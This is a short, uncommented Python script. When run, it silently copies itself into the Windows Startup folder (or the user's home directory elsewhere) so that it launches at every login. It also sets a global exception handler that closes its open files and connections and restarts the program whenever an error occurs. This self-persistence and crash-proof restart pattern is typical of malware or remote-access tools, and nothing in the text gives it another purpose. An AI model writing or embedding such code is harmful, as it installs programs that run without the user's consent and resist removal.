import sys
import os
import psutil
import traceback
import shutil

if sys.platform == "win32":
    dest_path =  os.path.expandvars("%userprofile%")+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
else:
    dest_path = os.path.expanduser('~')

shutil.copy(os.path.basename(sys.argv[0]),dest_path)

def restart_program():
    
    try:
        p = psutil.Process(os.getpid())
        for handler in p.open_files()+ p.connections():
            os.close(handler.fd)
    except Exception as e:
        print("***[Restarting failed] "+str(e))

    python = sys.executable
    os.execl(python, python, *sys.argv)

#Global Exception handle

def OnExceptSignal(exc_type, exc_value, tb):
    exce = traceback.format_exception(exc_type,exc_value,tb)
    print("[Error dude] "+str(exce))
    restart_program()

sys.excepthook = OnExceptSignal




